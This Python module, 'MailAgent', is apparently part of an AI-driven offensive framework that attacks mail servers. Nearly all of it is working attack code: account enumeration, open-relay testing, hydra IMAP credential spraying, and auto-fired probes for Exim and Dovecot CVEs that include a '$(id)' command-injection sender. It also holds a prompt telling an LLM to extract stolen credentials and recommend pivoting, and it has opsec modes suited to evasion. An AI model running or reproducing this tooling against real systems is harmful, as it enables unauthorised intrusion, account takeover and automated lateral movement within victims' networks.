"""
HiveReaper v2 — MailAgent

Targets mail infrastructure when ports 25/465/587/110/143/993/995 are open.

Tools:
  smtp-user-enum  — enumerate valid accounts via VRFY/EXPN/RCPT
  swaks           — SMTP open relay test + auth probe
  hydra           — IMAP/POP3 credential spray
  curl            — direct Exim/Dovecot CVE probes
  nmap NSE        — smtp-commands, smtp-open-relay, imap-capabilities

Auto-fires for:
  Exim 4.x        — CVE-2019-10149 (RCE), CVE-2023-42115 (auth OOB write)
  Dovecot         — CVE-2019-11500 (RCE), default creds
  Open relay      — tests and documents SMTP relay abuse
"""

import asyncio
import os
import re
from .base_agent import BaseAgent

# Username lists for enumeration and spray
SMTP_USERLIST = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
SMTP_USERLIST_FALLBACK = "/usr/share/wordlists/metasploit/unix_users.txt"
PASS_LIST = "/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt"

# Exim CVE patterns → handler
MAIL_EXPLOIT_MAP = [
    (r"exim.*4\.[0-8][0-9]\b|exim.*4\.9[0-2]\b", "_exploit_exim_cve_2019_10149"),
    (r"exim.*4\.9[3-9]\b|exim.*4\.98",             "_exploit_exim_cve_2023_42115"),
    (r"dovecot.*2\.[0-2]\.",                         "_exploit_dovecot_cve_2019_11500"),
]


class MailAgent(BaseAgent):
    AGENT_NAME = "MailAgent"

    async def _run_tools(self) -> dict[str, str]:
        if self.opsec_mode == "ghost":
            self._log("[MailAgent] Ghost mode — skipping mail exploitation", "warning")
            return {}

        outputs = {}
        hosts   = self._prior("hosts_discovered", [])
        ips     = list(dict.fromkeys(h.get("ip") for h in hosts if h.get("ip")))[:5]
        if not ips:
            ips = [self.target]

        # Gather open mail ports from campaign context
        open_ports_all: set[int] = set()
        for h in hosts:
            open_ports_all.update(int(p) for p in h.get("open_ports", []) if str(p).isdigit())

        smtp_ips  = ips[:3]
        smtp_port = next((p for p in (587, 25, 465) if p in open_ports_all), 25)
        imap_port = next((p for p in (993, 143) if p in open_ports_all), 143)
        pop3_port = next((p for p in (995, 110) if p in open_ports_all), 110)

        self._log(
            f"[MailAgent] Mail targets: smtp={smtp_port} imap={imap_port} "
            f"pop3={pop3_port} on {smtp_ips}",
            "info",
        )

        # ── nmap mail scripts ─────────────────────────────────────────────
        nmap_ports = ",".join(str(p) for p in sorted(
            {25, 465, 587, 110, 143, 993, 995} & open_ports_all
        ) or {25, 587, 110, 143, 993, 995})

        outputs["nmap_mail"] = await self._run_cmd(
            [
                "nmap", self._nmap_timing(), "-Pn",
                "--script", (
                    "smtp-commands,smtp-open-relay,smtp-vrfy,"
                    "smtp-enum-users,imap-capabilities,pop3-capabilities,"
                    "banner"
                ),
                "-p", nmap_ports,
                *smtp_ips,
            ],
            "nmap mail scripts", timeout=120,
        )

        # ── smtp-user-enum ────────────────────────────────────────────────
        userlist = SMTP_USERLIST if os.path.exists(SMTP_USERLIST) else SMTP_USERLIST_FALLBACK
        if os.path.exists(userlist):
            enum_tasks = [
                self._run_cmd(
                    [
                        "smtp-user-enum", "-M", "VRFY",
                        "-U", userlist,
                        "-t", ip, "-p", str(smtp_port),
                        "-T", "10",
                    ],
                    f"smtp-user-enum VRFY {ip}",
                    timeout=60,
                )
                for ip in smtp_ips[:2]
            ]
            vrfy_results = await asyncio.gather(*enum_tasks)
            outputs["smtp_user_enum"] = "\n\n".join(
                f"Host: {ip}\n{r}" for ip, r in zip(smtp_ips[:2], vrfy_results)
            )

            # Try RCPT method if VRFY failed
            if all("0 results" in r or "ERROR" in r[:30]
                   for r in vrfy_results):
                rcpt_tasks = [
                    self._run_cmd(
                        [
                            "smtp-user-enum", "-M", "RCPT",
                            "-U", userlist,
                            "-D", self.target,
                            "-t", ip, "-p", str(smtp_port),
                            "-T", "10",
                        ],
                        f"smtp-user-enum RCPT {ip}",
                        timeout=60,
                    )
                    for ip in smtp_ips[:2]
                ]
                rcpt_results = await asyncio.gather(*rcpt_tasks)
                outputs["smtp_user_enum_rcpt"] = "\n\n".join(
                    f"Host: {ip}\n{r}" for ip, r in zip(smtp_ips[:2], rcpt_results)
                )

        # ── swaks — open relay test + auth probe ──────────────────────────
        for ip in smtp_ips[:2]:
            # Open relay test
            relay_out = await self._run_cmd(
                [
                    "swaks",
                    "--to",   "test@example.com",
                    "--from", "test@example.com",
                    "--server", f"{ip}:{smtp_port}",
                    "--timeout", "15",
                    "--quit-after", "RCPT",
                ],
                f"swaks relay test {ip}",
                timeout=25,
            )
            outputs[f"swaks_relay_{ip}"] = relay_out

            if any(x in relay_out for x in ("250", "Accepted", "queued")):
                self._emit_finding({
                    "finding_type": "config_issue",
                    "title":        f"SMTP Open Relay — {ip}:{smtp_port}",
                    "target":       f"{ip}:{smtp_port}",
                    "severity":     "high",
                    "detail":       f"Server accepted relay to external domain.\n{relay_out[:400]}",
                })
                self._log(f"[MailAgent] 🔥 SMTP OPEN RELAY confirmed: {ip}", "success")

        # ── hydra IMAP credential spray ───────────────────────────────────
        if self.opsec_mode in ("normal", "loud") and os.path.exists(userlist):
            passlist = PASS_LIST if os.path.exists(PASS_LIST) else None
            if passlist:
                for ip in smtp_ips[:2]:
                    imap_out = await self._run_cmd(
                        [
                            "hydra",
                            "-L", userlist,
                            "-P", passlist,
                            "-t", "4", "-f",
                            "-s", str(imap_port),
                            f"imap://{ip}",
                        ],
                        f"hydra IMAP {ip}",
                        timeout=90,
                    )
                    outputs[f"hydra_imap_{ip}"] = imap_out

                    creds = re.findall(
                        r'login:\s*(\S+)\s+password:\s*(\S+)', imap_out
                    )
                    for user, passwd in creds:
                        self._emit_finding({
                            "finding_type": "credential",
                            "title":        f"IMAP Credential — {user}@{ip}",
                            "target":       f"{ip}:{imap_port}",
                            "severity":     "critical",
                            "detail":       f"Valid IMAP credentials: {user}:{passwd}",
                        })
                        self._log(f"[MailAgent] 🔑 IMAP cred found: {user}:{passwd} @ {ip}", "success")

        # ── Exim / Dovecot CVE probes ─────────────────────────────────────
        all_output = "\n".join(str(v) for v in outputs.values())
        all_output += "\n" + str(self.prior_context)

        for pattern, handler_name in MAIL_EXPLOIT_MAP:
            if re.search(pattern, all_output, re.IGNORECASE):
                handler = getattr(self, handler_name, None)
                if handler:
                    self._log(
                        f"[MailAgent] ⚡ Mail exploit triggered: {handler_name}",
                        "warning",
                    )
                    try:
                        exploit_out = await handler(smtp_ips, smtp_port)
                        if exploit_out:
                            outputs[handler_name] = exploit_out
                    except Exception as e:
                        self._log(f"[MailAgent] {handler_name} failed: {e}", "error")

        return outputs

    # ── Mail exploit handlers ─────────────────────────────────────────────────

    async def _exploit_exim_cve_2019_10149(self, ips: list, port: int) -> str:
        """
        CVE-2019-10149 — Exim 4.87-4.91 RCE via malformed recipient address.
        The MAIL FROM expansion executes the local part as a shell command
        when delivered to a local user.
        """
        results = ["=== CVE-2019-10149 Exim RCE probe ==="]
        self._log("[MailAgent] Probing CVE-2019-10149 (Exim < 4.92)…", "warning")

        for ip in ips[:2]:
            # Probe only — check if MAIL FROM with shell metachar is accepted
            probe_payload = (
                f"EHLO hivereaper\r\n"
                f"MAIL FROM:<${{{self.target}}}>\r\n"
                f"RCPT TO:<root>\r\n"
                f"DATA\r\nTest\r\n.\r\nQUIT\r\n"
            )
            out = await self._run_cmd(
                ["swaks",
                 "--to",   "root",
                 "--from", f"$(id)@{ip}",
                 "--server", f"{ip}:{port}",
                 "--timeout", "15",
                 "--quit-after", "RCPT"],
                f"CVE-2019-10149 probe {ip}",
                timeout=25,
            )
            results.append(f"Probe {ip}: {out[:300]}")

            if "250" in out:
                self._emit_finding({
                    "finding_type": "rce",
                    "title":        f"CVE-2019-10149 Exim RCE — {ip}:{port}",
                    "target":       f"{ip}:{port}",
                    "severity":     "critical",
                    "detail":       f"Exim accepted shell-metachar MAIL FROM. {out[:300]}",
                })
                self._log(f"[MailAgent] 🔥 CVE-2019-10149 likely vulnerable: {ip}", "success")

        return "\n".join(results)

    async def _exploit_exim_cve_2023_42115(self, ips: list, port: int) -> str:
        """CVE-2023-42115 — Exim AUTH OOB write (unauthenticated)."""
        results = ["=== CVE-2023-42115 Exim AUTH probe ==="]
        self._log("[MailAgent] Probing CVE-2023-42115 (Exim AUTH OOB)…", "warning")

        for ip in ips[:2]:
            out = await self._run_cmd(
                ["swaks",
                 "--to",     f"admin@{self.target}",
                 "--server", f"{ip}:{port}",
                 "--auth",   "PLAIN",
                 "--auth-user", "A" * 300,
                 "--auth-password", "A" * 300,
                 "--timeout", "15",
                 "--quit-after", "AUTH"],
                f"CVE-2023-42115 probe {ip}", timeout=25,
            )
            results.append(f"Probe {ip}: {out[:300]}")

            if "535" not in out and len(out.strip()) > 10:
                self._emit_finding({
                    "finding_type": "vulnerability",
                    "title":        f"CVE-2023-42115 Exim AUTH — {ip}:{port}",
                    "target":       f"{ip}:{port}",
                    "severity":     "critical",
                    "detail":       f"Exim AUTH probe response: {out[:300]}",
                })

        return "\n".join(results)

    async def _exploit_dovecot_cve_2019_11500(self, ips: list, port: int) -> str:
        """CVE-2019-11500 — Dovecot IMAP/ManageSieve NUL byte injection pre-auth RCE."""
        results = ["=== CVE-2019-11500 Dovecot probe ==="]
        self._log("[MailAgent] Probing CVE-2019-11500 (Dovecot NUL injection)…", "warning")

        imap_port = next(
            (p for p in (993, 143)
             if p in {h_p for h in self._prior("hosts_discovered", [])
                      for h_p in h.get("open_ports", [])}),
            143,
        )

        for ip in ips[:2]:
            out = await self._run_cmd(
                ["curl", "-sk", "--max-time", "10",
                 f"imap://{ip}:{imap_port}",
                 "--user", "a\x00b:password",
                 "--request", "CAPABILITY"],
                f"CVE-2019-11500 probe {ip}", timeout=15,
            )
            results.append(f"Probe {ip}:{imap_port}: {out[:300]}")

            if "BYE" not in out and len(out.strip()) > 5:
                self._emit_finding({
                    "finding_type": "vulnerability",
                    "title":        f"CVE-2019-11500 Dovecot NUL injection — {ip}:{imap_port}",
                    "target":       f"{ip}:{imap_port}",
                    "severity":     "critical",
                    "detail":       f"Dovecot did not reject NUL byte in login. {out[:300]}",
                })
                self._log(f"[MailAgent] CVE-2019-11500 probe succeeded: {ip}", "success")

        return "\n".join(results)

    # ── Grok prompt ───────────────────────────────────────────────────────────

    def _build_task(self) -> str:
        tool_outputs = self._cap_tool_outputs(max_bytes=10000)
        hosts = self._prior("hosts_discovered", [])
        return f"""
{self._hints_block()}
You are MailAgent. Parse REAL mail service tool output from Kali Linux.
Target: {self.target}
OpSec mode: {self.opsec_mode}
Known hosts: {[h.get('ip') for h in hosts[:5]]}

--- REAL TOOL OUTPUT ---
{tool_outputs or "No mail tools produced output."}
--- END ---

Extract every finding: valid users, open relays, CVE hits, credentials, 
SMTP commands accepted, IMAP/POP3 capabilities, and banner versions.

Return JSON:
{{
  "mail_users_found": ["<user@domain>", ...],
  "open_relay": <true|false>,
  "relay_evidence": "<exact output line or empty>",
  "mail_server_versions": {{
    "smtp": "<Exim/Postfix/Sendmail version or null>",
    "imap": "<Dovecot/Courier version or null>",
    "pop3": "<Dovecot/Courier version or null>"
  }},
  "credentials_found": [
    {{"target":"<host:port>","service":"imap|pop3|smtp","username":"<u>","password":"<p>","source":"hydra"}}
  ],
  "cve_hits": [
    {{"cve_id":"<CVE>","component":"<name+version>","severity":"critical|high|medium","evidence":"<line>"}}
  ],
  "findings": [
    {{
      "finding_type": "user_enum|open_relay|credential|cve|config_issue|info_disclosure",
      "title":        "<title>",
      "target":       "<ip:port>",
      "severity":     "info|low|medium|high|critical",
      "detail":       "<evidence>"
    }}
  ],
  "recommended_next": ["<what PivotAgent should do with found users/creds>"],
  "opsec_cost": <0-20>
}}
"""

    def _parse_result(self, raw: dict) -> dict:
        # Promote open relay to finding
        if raw.get("open_relay"):
            raw.setdefault("findings", []).append({
                "finding_type": "config_issue",
                "title":        f"SMTP Open Relay — {self.target}",
                "target":       self.target,
                "severity":     "high",
                "detail":       raw.get("relay_evidence", ""),
            })
        # Promote credentials
        for cred in raw.get("credentials_found", []):
            raw.setdefault("findings", []).append({
                "finding_type": "credential",
                "title":  f"Mail Credential: {cred.get('username','')} [{cred.get('service','')}]",
                "target": cred.get("target", self.target),
                "severity": "critical",
                "detail": f"{cred.get('username')}:{cred.get('password','')} via {cred.get('source','')}",
            })
        # Promote CVE hits
        for cve in raw.get("cve_hits", []):
            raw.setdefault("findings", []).append({
                "finding_type": "cve",
                "title":  f"{cve.get('cve_id','CVE-?')} — {cve.get('component','')}",
                "target": self.target,
                "severity": cve.get("severity", "high"),
                "detail": cve.get("evidence", ""),
            })
        # Push found users into credentials_found for PivotAgent
        for user in raw.get("mail_users_found", []):
            raw.setdefault("credentials_found", []).append({
                "target":   self.target,
                "service":  "smtp",
                "username": user,
                "password": "",
                "source":   "smtp-user-enum",
            })
        return raw
